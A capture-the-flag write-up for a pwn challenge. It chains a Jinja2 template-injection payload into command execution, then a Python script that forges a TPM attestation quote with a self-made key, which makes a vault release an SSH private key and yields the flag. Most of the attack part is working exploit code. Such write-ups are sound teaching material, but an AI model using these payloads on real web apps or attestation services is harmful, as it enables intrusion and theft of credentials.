# KeyStone-User

**Event:** CryoVault CTF 2026
**Category:** pwn
**Flag:** `isfcr{tr0st_but_v3rify_the_endors3ment}`

---

Target `10.48.177.211`, "Keystone - Attestation Portal" (Flask on nginx, port 80) plus SSH. The homepage describes an attestation-gated secret vault at `127.0.0.1:9000`, a software TPM (`swtpm`) at `127.0.0.1:2321`, and a `/review?doc=<name>` document viewer. Docs leak that `/review` added a risky Jinja2 render, and that the vault "treats the client-supplied AK as trusted after signature verification only" - plus the vault source path, the AK TPM handle, and the `measure-and-run` sudo helper (relevant to the Root stage).

**SSTI → RCE:** path traversal on `doc` is blocked, but the value renders through Jinja2 and is echoed on the error page: `{{7*7}}` → `49` confirms it; `os` is reachable through `cycler`'s globals:

```bash
curl -sG http://10.48.177.211/review \
  --data-urlencode "doc={{cycler.__init__.__globals__.os.popen('id').read()}}"
# uid=1001(webapp) gid=1001(webapp) groups=1001(webapp),994(tpm)
```

RCE as `webapp` (member of the `tpm` group), giving access to the Go vault source and the attestation protocol internals.

**Forging the attestation (VAULT-114):** `/opt/vault/main.go` implements `POST /attest` → `POST /verify` → `GET /secret`. `/verify` checks the quote signature against **the AK pubkey the client itself supplied in `/attest`**, validates the `TPMS_ATTEST` magic/type/nonce, and pins PCR0/1/7 digest to an all-zero golden state - but never performs **credential activation** (`TPM2_MakeCredential`/`ActivateCredential`) to bind that client-supplied AK to the real hardware/software TPM's endorsement key. So any RSA key can be presented as the AK.

```python
priv = rsa.generate_private_key(...)                  # our own "AK"
a = requests.post(f"{BASE}/attest", json={"ak_pub_pem": pub_pem}).json()
buf  = struct.pack(">I", 0xFF544347)                   # TPM_GENERATED_VALUE
buf += struct.pack(">H", 0x8018)                       # TPM_ST_ATTEST_QUOTE
buf += blob16(b"") + blob16(nonce) + b"\x00"*17 + b"\x00"*8
buf += struct.pack(">I", 0) + blob16(expected_digest)  # pcrDigest pinned to zero
sig = priv.sign(buf, padding.PKCS1v15(), hashes.SHA256())
tok = requests.post(f"{BASE}/verify", json={...}).json()["token"]
requests.get(f"{BASE}/secret", params={"token": tok}).json()["payload"]
```

The vault releases **tpm-admin's SSH private key**.

```bash
ssh -i tpm-admin.key tpm-admin@10.48.177.211
cat /home/tpm-admin/user.txt
# isfcr{tr0st_but_v3rify_the_endors3ment}
```

Root cause: the vault verified a signature but never verified the **endorsement** (EK) behind the key - exactly the flag's "trust but verify the endorsement."
